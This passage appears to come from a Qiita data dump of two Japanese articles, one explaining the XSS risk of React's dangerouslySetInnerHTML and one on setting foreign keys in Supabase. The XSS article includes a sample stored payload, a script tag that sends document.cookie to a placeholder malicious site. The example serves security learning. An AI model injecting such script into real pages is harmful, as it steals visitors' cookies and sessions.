data-sourcepos=\"21:1-21:25\"><strong>wikipediaより引用</strong></p>\n<blockquote data-sourcepos=\"22:1-23:461\">\n<p data-sourcepos=\"22:2-22:167\">クロスサイトスクリプティング（英: cross-site scripting）とは、Webアプリケーションの脆弱性[1]もしくはそれを利用した攻撃。</p>\n<blockquote data-sourcepos=\"23:2-23:461\">\n<p data-sourcepos=\"23:3-23:461\">標的サイトの権限で悪意のあるコンテンツ（多くの場合スクリプト）を実行する事を目的として行われる[5][1]。悪意のあるコンテンツは標的サイトの権限で実行されるので、同一生成元ポリシーによる制限が迂回される[5][1]。これを悪用する事により攻撃者は標的サイトを閲覧したユーザ（＝被害者）のcookieを盗むなど、様々な攻撃を行う。</p>\n</blockquote>\n</blockquote>\n<p data-sourcepos=\"25:1-26:160\">サイトの脆弱性を利用して、悪意のあるコンテンツを実行させると理解<br>\n調べたものの、なぜ<code>dangerouslySetInnerHTML</code>が悪意のあるコンテンツを実行させることができるのかわからない状態でした。</p>\n<h1 data-sourcepos=\"28:1-28:29\">\n<span id=\"具体例を考えてみる\" class=\"fragment\"></span><a href=\"#%E5%85%B7%E4%BD%93%E4%BE%8B%E3%82%92%E8%80%83%E3%81%88%E3%81%A6%E3%81%BF%E3%82%8B\"><i class=\"fa fa-link\"></i></a>具体例を考えてみる</h1>\n<p data-sourcepos=\"30:1-30:159\">例えば、WEBアプリケーション上で操作し、DBにhtmlタグを含むデータを登録、取得できるように管理しているとします。</p>\n<table data-sourcepos=\"32:1-36:29\">\n<thead>\n<tr data-sourcepos=\"32:1-32:22\">\n<th style=\"text-align: center\" data-sourcepos=\"32:2-32:5\">id</th>\n<th style=\"text-align: center\" data-sourcepos=\"32:7-32:12\">name</th>\n<th style=\"text-align: center\" data-sourcepos=\"32:14-32:21\">script</th>\n</tr>\n</thead>\n<tbody>\n<tr data-sourcepos=\"34:1-34:29\">\n<td style=\"text-align: center\" data-sourcepos=\"34:2-34:5\">1</td>\n<td style=\"text-align: center\" data-sourcepos=\"34:7-34:12\">あ</td>\n<td style=\"text-align: center\" data-sourcepos=\"34:14-34:28\">&lt;p&gt;あ&lt;/p&gt;</td>\n</tr>\n<tr data-sourcepos=\"35:1-35:29\">\n<td style=\"text-align: center\" data-sourcepos=\"35:2-35:5\">2</td>\n<td style=\"text-align: center\" data-sourcepos=\"35:7-35:12\">い</td>\n<td style=\"text-align: center\" data-sourcepos=\"35:14-35:28\">&lt;p&gt;あ&lt;/p&gt;</td>\n</tr>\n<tr data-sourcepos=\"36:1-36:29\">\n<td style=\"text-align: center\" data-sourcepos=\"36:2-36:5\">3</td>\n<td style=\"text-align: center\" data-sourcepos=\"36:7-36:12\">う</td>\n<td style=\"text-align: center\" data-sourcepos=\"36:14-36:28\">&lt;p&gt;あ&lt;/p&gt;</td>\n</tr>\n</tbody>\n</table>\n<p data-sourcepos=\"38:1-38:151\">この場合、WEBアプリケーション上で悪意のあるユーザーが以下のid=4のようなデータを登録することが可能です。</p>\n<table data-sourcepos=\"40:1-45:125\">\n<thead>\n<tr data-sourcepos=\"40:1-40:22\">\n<th style=\"text-align: center\" data-sourcepos=\"40:2-40:5\">id</th>\n<th style=\"text-align: center\" data-sourcepos=\"40:7-40:12\">name</th>\n<th style=\"text-align: center\" data-sourcepos=\"40:14-40:21\">script</th>\n</tr>\n</thead>\n<tbody>\n<tr data-sourcepos=\"42:1-42:29\">\n<td style=\"text-align: center\" data-sourcepos=\"42:2-42:5\">1</td>\n<td style=\"text-align: center\" data-sourcepos=\"42:7-42:12\">あ</td>\n<td style=\"text-align: center\" data-sourcepos=\"42:14-42:28\">&lt;p&gt;あ&lt;/p&gt;</td>\n</tr>\n<tr data-sourcepos=\"43:1-43:29\">\n<td style=\"text-align: center\" data-sourcepos=\"43:2-43:5\">2</td>\n<td style=\"text-align: center\" data-sourcepos=\"43:7-43:12\">い</td>\n<td style=\"text-align: center\" data-sourcepos=\"43:14-43:28\">&lt;p&gt;あ&lt;/p&gt;</td>\n</tr>\n<tr data-sourcepos=\"44:1-44:29\">\n<td style=\"text-align: center\" data-sourcepos=\"44:2-44:5\">3</td>\n<td style=\"text-align: center\" data-sourcepos=\"44:7-44:12\">う</td>\n<td style=\"text-align: center\" data-sourcepos=\"44:14-44:28\">&lt;p&gt;あ&lt;/p&gt;</td>\n</tr>\n<tr data-sourcepos=\"45:1-45:125\">\n<td style=\"text-align: center\" data-sourcepos=\"45:2-45:5\">4</td>\n<td style=\"text-align: center\" data-sourcepos=\"45:7-45:12\">え</td>\n<td style=\"text-align: center\" data-sourcepos=\"45:14-45:124\">&lt;script&gt;location.href = '<a href=\"http://%E6%82%AA%E6%84%8F%E3%81%AE%E3%81%82%E3%82%8B%E3%82%B5%E3%82%A4%E3%83%88/getCookie.cgi?cookie=\" class=\"autolink\" rel=\"nofollow noopener\" target=\"_blank\">http://悪意のあるサイト/getCookie.cgi?cookie=</a>' + document.cookie;&lt;/script&gt;</td>\n</tr>\n</tbody>\n</table>\n<p data-sourcepos=\"47:1-47:165\">id=4の登録データをdangerouslySetInnerHTMLで表示した場合、悪意のあるスクリプトが実行され、cookieなどが盗まれてしまいます。</p>\n<p data-sourcepos=\"49:1-49:42\">これがXSS攻撃と理解しました。</p>\n<p data-sourcepos=\"51:1-51:149\">そのため、dangerouslySetInnerHTMLは信頼できるソースでのみ使用することを留意しないといけないと理解しました。</p>\n<h1 data-sourcepos=\"53:1-53:14\">\n<span id=\"おわりに\" class=\"fragment\"></span><a href=\"#%E3%81%8A%E3%82%8F%E3%82%8A%E3%81%AB\"><i class=\"fa fa-link\"></i></a>おわりに</h1>\n<p data-sourcepos=\"54:1-55:72\">dangerousと名前につけるほど危険な機能だなと理解しましたが、何も背景を理解せず利用すると怖いものだなと思いました。<br>\nセキュリティの勉強も少しずつ進めていきたいです。</p>\n<h1 data-sourcepos=\"57:1-57:8\">\n<span id=\"参考\" class=\"fragment\"></span><a href=\"#%E5%8F%82%E8%80%83\"><i class=\"fa fa-link\"></i></a>参考</h1>\n<p data-sourcepos=\"58:1-58:93\"><iframe id=\"qiita-embed-content__aeddf1715cb1737ad320dc39a4aea6fd\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__aeddf1715cb1737ad320dc39a4aea6fd\" data-content=\"https%3A%2F%2Fja.react.dev%2Freference%2Freact-dom%2Fcomponents%2Fcommon%23dangerously-setting-the-inner-html\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"60:1-60:53\"><iframe id=\"qiita-embed-content__8cd702a9d02a3faf88754fc31c421c8e\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__8cd702a9d02a3faf88754fc31c421c8e\" data-content=\"https%3A%2F%2Fqiita.com%2Fhiromoon%2Fitems%2Ff3ed77abd338139ba97b\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"62:1-62:73\"><iframe id=\"qiita-embed-content__5b319c0dda203d555f78060387b8276e\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__5b319c0dda203d555f78060387b8276e\" data-content=\"https%3A%2F%2Fwww.ipa.go.jp%2Fsecurity%2Fvuln%2Fwebsecurity%2Fcross-site-scripting.html\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"64:1-64:156\"><iframe id=\"qiita-embed-content__8f5839b325f887df75c67bf215a811a6\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__8f5839b325f887df75c67bf215a811a6\" data-content=\"https%3A%2F%2Fja.wikipedia.org%2Fwiki%2F%25E3%2582%25AF%25E3%2583%25AD%25E3%2582%25B9%25E3%2582%25B5%25E3%2582%25A4%25E3%2583%2588%25E3%2582%25B9%25E3%2582%25AF%25E3%2583%25AA%25E3%2583%2597%25E3%2583%2586%25E3%2582%25A3%25E3%2583%25B3%25E3%2582%25B0\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"66:1-66:38\"><iframe id=\"qiita-embed-content__72fcb1f7d98d0c53c233a365e417830f\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__72fcb1f7d98d0c53c233a365e417830f\" data-content=\"https%3A%2F%2Fwww.tohoho-web.com%2Fex%2Fxss.html\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n","body":"# はじめに\n学習中に`dangerouslySetInnerHTML`を使用する機会がありました。XSSとは何か、なぜ危険なのかわからなかったため、学んだことをまとめてみました。\n\n# dangerouslySetInnerHTMLとは\n\n**公式ドキュメントより引用**\n>以下のように、要素に対して生の HTML 文字列を渡すことができます。\n```tsx\nconst markup = { __html: '<p>some raw html</p>' };\nreturn <div dangerouslySetInnerHTML={markup} />;\n```\n\n公式ドキュメントのタイトルは**危険を冒して内部 HTML をセットする**となっています。\n\n>マークアップが完全に信頼できるソースから来ていない限り、この方法を使うといとも簡単に XSS 脆弱性が発生します。\n\n名前にdangerousとつくほど注意が必要な機能です。**XSS 脆弱性**とは何なのでしょうか？\n\n# XSSとは\n\n**wikipediaより引用**\n>クロスサイトスクリプティング（英: cross-site scripting）とは、Webアプリケーションの脆弱性[1]もしくはそれを利用した攻撃。\n>>標的サイトの権限で悪意のあるコンテンツ（多くの場合スクリプト）を実行する事を目的として行われる[5][1]。悪意のあるコンテンツは標的サイトの権限で実行されるので、同一生成元ポリシーによる制限が迂回される[5][1]。これを悪用する事により攻撃者は標的サイトを閲覧したユーザ（＝被害者）のcookieを盗むなど、様々な攻撃を行う。\n\nサイトの脆弱性を利用して、悪意のあるコンテンツを実行させると理解\n調べたものの、なぜ`dangerouslySetInnerHTML`が悪意のあるコンテンツを実行させることができるのかわからない状態でした。\n\n# 具体例を考えてみる\n\n例えば、WEBアプリケーション上で操作し、DBにhtmlタグを含むデータを登録、取得できるように管理しているとします。\n\n| id | name | script |\n|:-:|:-:|:-:|\n| 1  |  あ | \\<p>あ\\</p>  |\n| 2  |  い | \\<p>あ\\</p>  |\n| 3  |  う | \\<p>あ\\</p>  |\n\nこの場合、WEBアプリケーション上で悪意のあるユーザーが以下のid=4のようなデータを登録することが可能です。\n\n| id | name | script |\n|:-:|:-:|:-:|\n| 1  |  あ | \\<p>あ\\</p>  |\n| 2  |  い | \\<p>あ\\</p>  |\n| 3  |  う | \\<p>あ\\</p>  |\n| 4  |  え | \\<script>location.href = 'http://悪意のあるサイト/getCookie.cgi?cookie=' + document.cookie;\\</script> |\n\nid=4の登録データをdangerouslySetInnerHTMLで表示した場合、悪意のあるスクリプトが実行され、cookieなどが盗まれてしまいます。\n\nこれがXSS攻撃と理解しました。\n\nそのため、dangerouslySetInnerHTMLは信頼できるソースでのみ使用することを留意しないといけないと理解しました。\n\n# おわりに\ndangerousと名前につけるほど危険な機能だなと理解しましたが、何も背景を理解せず利用すると怖いものだなと思いました。\nセキュリティの勉強も少しずつ進めていきたいです。\n\n# 参考\nhttps://ja.react.dev/reference/react-dom/components/common#dangerously-setting-the-inner-html\n\nhttps://qiita.com/hiromoon/items/f3ed77abd338139ba97b\n\nhttps://www.ipa.go.jp/security/vuln/websecurity/cross-site-scripting.html\n\nhttps://ja.wikipedia.org/wiki/%E3%82%AF%E3%83%AD%E3%82%B9%E3%82%B5%E3%82%A4%E3%83%88%E3%82%B9%E3%82%AF%E3%83%AA%E3%83%97%E3%83%86%E3%82%A3%E3%83%B3%E3%82%B0\n\nhttps://www.tohoho-web.com/ex/xss.html\n","coediting":false,"comments_count":0,"created_at":"2025-05-02T21:16:13+09:00","group":null,"id":"8597408ac24eefa2f00a","likes_count":1,"private":false,"reactions_count":0,"stocks_count":0,"tags":[{"name":"xss","versions":[]},{"name":"React","versions":[]}],"title":"dangerouslySetInnerHTMLはなぜ危険？","updated_at":"2025-05-02T21:16:13+09:00","url":"https://qiita.com/asa129/items/8597408ac24eefa2f00a","user":{"description":"0→1でWebアプリケーションを作れるようになるために奮闘中です。\r\nアイコンは@chinchilla.maruさん\r\nhttps://www.instagram.com/chinchilla.maru/","facebook_id":"","followees_count":45,"followers_count":53,"github_login_name":"asa129","id":"asa129","items_count":62,"linkedin_id":"","location":"","name":"","organization":"","permanent_id":3993509,"profile_image_url":"https://s3-ap-northeast-1.amazonaws.com/qiita-image-store/0/3993509/ea9105b8f7fedddb7175e913eeb5c288385a364a/large.png?1739071881","team_only":false,"twitter_screen_name":"jad1290","website_url":""},"page_views_count":475,"team_membership":null,"organization_url_name":"jisou","slide":false},{"rendered_body":"<h1 data-sourcepos=\"1:1-1:14\">\n<span id=\"はじめに\" class=\"fragment\"></span><a href=\"#%E3%81%AF%E3%81%98%E3%82%81%E3%81%AB\"><i class=\"fa fa-link\"></i></a>はじめに</h1>\n<p data-sourcepos=\"2:1-2:110\">Supabaseから複数の関連テーブルからデータを取得しようとした際につまりました。</p>\n<h1 data-sourcepos=\"4:1-4:8\">\n<span id=\"問題\" class=\"fragment\"></span><a href=\"#%E5%95%8F%E9%A1%8C\"><i class=\"fa fa-link\"></i></a>問題</h1>\n<p data-sourcepos=\"5:1-6:60\">以下の３つのテーブルを定義していました。<br>\n下記の手順でデータを取得したかったです。</p>\n<ul data-sourcepos=\"8:1-10:36\">\n<li data-sourcepos=\"8:1-8:82\">usersテーブルのuser_idを元に、user_skillテーブルのuser_idを参照</li>\n<li data-sourcepos=\"9:1-9:79\">user_skillテーブルのskill_idを元に、skillsテーブルのidを参照</li>\n<li data-sourcepos=\"10:1-10:36\">skillsテーブルのnameを取得</li>\n</ul>\n<br>\n<ul data-sourcepos=\"13:1-14:0\">\n<li data-sourcepos=\"13:1-14:0\"><strong>usersテーブル</strong></li>\n</ul>\n<table data-sourcepos=\"15:1-17:88\">\n<thead>\n<tr data-sourcepos=\"15:1-15:130\">\n<th style=\"text-align: center\" data-sourcepos=\"15:2-15:19\">user_id: varchar</th>\n<th style=\"text-align: center\" data-sourcepos=\"15:21-15:35\">name: varchar</th>\n<th style=\"text-align: center\" data-sourcepos=\"15:37-15:55\">description: text</th>\n<th style=\"text-align: center\" data-sourcepos=\"15:57-15:71\">a_id: varchar</th>\n<th style=\"text-align: center\" data-sourcepos=\"15:73-15:87\">b_id: varchar</th>\n<th style=\"text-align: center\" data-sourcepos=\"15:89-15:103\">c_id: varchar</th>\n<th style=\"text-align: center\" data-sourcepos=\"15:105-15:129\">created_at: timestamptz</th>\n</tr>\n</thead>\n<tbody>\n<tr data-sourcepos=\"17:1-17:88\">\n<td style=\"text-align: center\" data-sourcepos=\"17:2-17:12\">sample-id</td>\n<td style=\"text-align: center\" data-sourcepos=\"17:14-17:24\">なまえ</td>\n<td style=\"text-align: center\" data-sourcepos=\"17:26-17:47\">&lt;h1&gt;なまえ&lt;/h1&gt;</td>\n<td style=\"text-align: center\" data-sourcepos=\"17:49-17:56\">aのid</td>\n<td style=\"text-align: center\" data-sourcepos=\"17:58-17:65\">bのid</td>\n<td style=\"text-align: center\" data-sourcepos=\"17:67-17:74\">cのid</td>\n<td style=\"text-align: center\" data-sourcepos=\"17:76-17:87\">2025-XX-XX</td>\n</tr>\n</tbody>\n</table>\n<ul data-sourcepos=\"19:1-20:0\">\n<li data-sourcepos=\"19:1-20:0\"><strong>user_skillテーブル</strong></li>\n</ul>\n<table data-sourcepos=\"21:1-23:34\">\n<thead>\n<tr data-sourcepos=\"21:1-21:74\">\n<th style=\"text-align: center\" data-sourcepos=\"21:2-21:11\">id: int8</th>\n<th style=\"text-align: center\" data-sourcepos=\"21:13-21:30\">user_id: varchar</th>\n<th style=\"text-align: center\" data-sourcepos=\"21:32-21:47\">skill_id: int8</th>\n<th style=\"text-align: center\" data-sourcepos=\"21:49-21:73\">created_at: timestamptz</th>\n</tr>\n</thead>\n<tbody>\n<tr data-sourcepos=\"23:1-23:34\">\n<td style=\"text-align: center\" data-sourcepos=\"23:2-23:4\">1</td>\n<td style=\"text-align: center\" data-sourcepos=\"23:6-23:16\">sample-id</td>\n<td style=\"text-align: center\" data-sourcepos=\"23:18-23:20\">1</td>\n<td style=\"text-align: center\" data-sourcepos=\"23:22-23:33\">2025-XX-XX</td>\n</tr>\n</tbody>\n</table>\n<ul data-sourcepos=\"25:1-26:0\">\n<li data-sourcepos=\"25:1-26:0\"><strong>skillsテーブル</strong></li>\n</ul>\n<table data-sourcepos=\"27:1-31:27\">\n<thead>\n<tr data-sourcepos=\"27:1-27:54\">\n<th style=\"text-align: center\" data-sourcepos=\"27:2-27:11\">id: int8</th>\n<th style=\"text-align: center\" data-sourcepos=\"27:13-27:27\">name: varchar</th>\n<th style=\"text-align: center\" data-sourcepos=\"27:29-27:53\">created_at: timestamptz</th>\n</tr>\n</thead>\n<tbody>\n<tr data-sourcepos=\"29:1-29:26\">\n<td style=\"text-align: center\" data-sourcepos=\"29:2-29:4\">1</td>\n<td style=\"text-align: center\" data-sourcepos=\"29:6-29:12\">React</td>\n<td style=\"text-align: center\" data-sourcepos=\"29:14-29:25\">2025-XX-XX</td>\n</tr>\n<tr data-sourcepos=\"30:1-30:31\">\n<td style=\"text-align: center\" data-sourcepos=\"30:2-30:4\">2</td>\n<td style=\"text-align: center\" data-sourcepos=\"30:6-30:17\">TypeScript</td>\n<td style=\"text-align: center\" data-sourcepos=\"30:19-30:30\">2025-XX-XX</td>\n</tr>\n<tr data-sourcepos=\"31:1-31:27\">\n<td style=\"text-align: center\" data-sourcepos=\"31:2-31:4\">3</td>\n<td style=\"text-align: center\" data-sourcepos=\"31:6-31:13\">GitHub</td>\n<td style=\"text-align: center\" data-sourcepos=\"31:15-31:26\">2025-XX-XX</td>\n</tr>\n</tbody>\n</table>\n<p data-sourcepos=\"33:1-33:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F9b300f86-da16-4200-978f-a022d1ba7f8f.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=143b75cb23d4c39b945a18f1a08f8288\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F9b300f86-da16-4200-978f-a022d1ba7f8f.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=143b75cb23d4c39b945a18f1a08f8288\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F9b300f86-da16-4200-978f-a022d1ba7f8f.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=834d835d874dd58b8e33ae15de664036 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/9b300f86-da16-4200-978f-a022d1ba7f8f.png\" loading=\"lazy\"></a></p>\n<h1 data-sourcepos=\"37:1-37:14\">\n<span id=\"解決方法\" class=\"fragment\"></span><a href=\"#%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95\"><i class=\"fa fa-link\"></i></a>解決方法</h1>\n<h2 data-sourcepos=\"38:1-38:55\">\n<span id=\"user_skillテーブルに外部キーを設定する\" class=\"fragment\"></span><a href=\"#user_skill%E3%83%86%E3%83%BC%E3%83%96%E3%83%AB%E3%81%AB%E5%A4%96%E9%83%A8%E3%82%AD%E3%83%BC%E3%82%92%E8%A8%AD%E5%AE%9A%E3%81%99%E3%82%8B\"><i class=\"fa fa-link\"></i></a>user_skillテーブルに外部キーを設定する</h2>\n<ul data-sourcepos=\"40:1-44:0\">\n<li data-sourcepos=\"40:1-41:58\">user_skillテーブルの<code>user_id</code>を外部キーとして設定<br>\n（参照先はusersテーブルの主キー: <code>user_id</code>）</li>\n<li data-sourcepos=\"42:1-44:0\">user_skillテーブルの<code>skill_id</code>を外部キーとして設定<br>\n（参照先はskillsテーブルの主キー: <code>id</code>）</li>\n</ul>\n<h3 data-sourcepos=\"45:1-45:22\">\n<span id=\"外部キーとは\" class=\"fragment\"></span><a href=\"#%E5%A4%96%E9%83%A8%E3%82%AD%E3%83%BC%E3%81%A8%E3%81%AF\"><i class=\"fa fa-link\"></i></a>外部キーとは</h3>\n<p data-sourcepos=\"46:1-46:95\">あるテーブルのカラム（列）が別のテーブルの<code>主キー</code>を参照すること</p>\n<h3 data-sourcepos=\"48:1-48:43\">\n<span id=\"なぜ外部キーの設定が必要\" class=\"fragment\"></span><a href=\"#%E3%81%AA%E3%81%9C%E5%A4%96%E9%83%A8%E3%82%AD%E3%83%BC%E3%81%AE%E8%A8%AD%E5%AE%9A%E3%81%8C%E5%BF%85%E8%A6%81\"><i class=\"fa fa-link\"></i></a>なぜ外部キーの設定が必要？</h3>\n<p data-sourcepos=\"49:1-49:51\">外部整合制約のメリットをもらうため</p>\n<h4 data-sourcepos=\"51:1-51:32\">\n<span id=\"データの整合性保持\" class=\"fragment\"></span><a href=\"#%E3%83%87%E3%83%BC%E3%82%BF%E3%81%AE%E6%95%B4%E5%90%88%E6%80%A7%E4%BF%9D%E6%8C%81\"><i class=\"fa fa-link\"></i></a>データの整合性保持</h4>\n<p data-sourcepos=\"52:1-52:177\">skillsテーブルのid=1のレコードを削除した場合、user_skillテーブルのskill_id=1はどこも参照できず、ただのデータになってしまいます。</p>\n<h4 data-sourcepos=\"54:1-54:23\">\n<span id=\"誤削除の防止\" class=\"fragment\"></span><a href=\"#%E8%AA%A4%E5%89%8A%E9%99%A4%E3%81%AE%E9%98%B2%E6%AD%A2\"><i class=\"fa fa-link\"></i></a>誤削除の防止</h4>\n<p data-sourcepos=\"55:1-55:129\">外部キーの設定を行うことで、意図せずレコードを削除してしまうことを防ぐことができます。</p>\n<p data-sourcepos=\"57:1-57:109\">試しに、skill_id=1を消そうとすると、エラーとなり削除を防ぐことができました。</p>\n<p data-sourcepos=\"59:1-59:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F6a6e8553-b3e4-43a1-afb6-5f9b42764fec.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=73495e1be23ea8f01129668b11ffb1e2\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F6a6e8553-b3e4-43a1-afb6-5f9b42764fec.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=73495e1be23ea8f01129668b11ffb1e2\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F6a6e8553-b3e4-43a1-afb6-5f9b42764fec.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=f24f213288add96c107650b1cbe6b29c 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/6a6e8553-b3e4-43a1-afb6-5f9b42764fec.png\" loading=\"lazy\"></a></p>\n<h2 data-sourcepos=\"62:1-62:55\">\n<span id=\"supabaseのdashbordから外部キーを設定する\" class=\"fragment\"></span><a href=\"#supabase%E3%81%AEdashbord%E3%81%8B%E3%82%89%E5%A4%96%E9%83%A8%E3%82%AD%E3%83%BC%E3%82%92%E8%A8%AD%E5%AE%9A%E3%81%99%E3%82%8B\"><i class=\"fa fa-link\"></i></a>Supabaseのdashbordから外部キーを設定する</h2>\n<ol data-sourcepos=\"63:1-64:0\">\n<li data-sourcepos=\"63:1-64:0\">user_skillテーブルのuser_idをクリック、<code>Edit column</code>を選択</li>\n</ol>\n<p data-sourcepos=\"65:1-65:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fb99f4be4-60a9-46a1-82ae-0fd27cd8fdd1.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=1d7d5196fc7b5cba93cfe49e0a4c3f77\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fb99f4be4-60a9-46a1-82ae-0fd27cd8fdd1.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=1d7d5196fc7b5cba93cfe49e0a4c3f77\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fb99f4be4-60a9-46a1-82ae-0fd27cd8fdd1.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=f84777d2d79acb03178c02cb4e39a4b3 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/b99f4be4-60a9-46a1-82ae-0fd27cd8fdd1.png\" loading=\"lazy\"></a></p>\n<p data-sourcepos=\"67:1-67:30\">2. <code>Add foreign key</code>を押下</p>\n<p data-sourcepos=\"69:1-69:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F01c12a4b-3a2f-4efc-a396-3899c0bfdad3.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=bbaf982b5b103e6a89cb617c5bd1ee16\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F01c12a4b-3a2f-4efc-a396-3899c0bfdad3.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=bbaf982b5b103e6a89cb617c5bd1ee16\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F01c12a4b-3a2f-4efc-a396-3899c0bfdad3.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=d7683f539191cf11e3e54cc2061c009d 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/01c12a4b-3a2f-4efc-a396-3899c0bfdad3.png\" loading=\"lazy\"></a></p>\n<p data-sourcepos=\"72:1-72:71\">3. 参照するテーブルを選択（今回は<code>usersテーブル</code>）</p>\n<p data-sourcepos=\"74:1-74:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fa07e574c-f5e0-4ae4-ab93-9ae23cd6fc1a.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=d870bde9865d8c6871ae55e71afafbcb\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fa07e574c-f5e0-4ae4-ab93-9ae23cd6fc1a.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=d870bde9865d8c6871ae55e71afafbcb\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fa07e574c-f5e0-4ae4-ab93-9ae23cd6fc1a.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=fd6d4313d31179ae296c08c940b71566 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/a07e574c-f5e0-4ae4-ab93-9ae23cd6fc1a.png\" loading=\"lazy\"></a></p>\n<p data-sourcepos=\"76:1-76:94\">4. 参照するカラムを選択（今回は<code>user_idカラム</code>）選択後、<code>Save</code>を押下</p>\n<p data-sourcepos=\"78:1-78:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F5ded0301-377f-4fb6-9762-778d1d01f452.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=69b1d24109e31b07fdd14a91cd9dd2a1\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F5ded0301-377f-4fb6-9762-778d1d01f452.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=69b1d24109e31b07fdd14a91cd9dd2a1\" alt=\"image.png\" 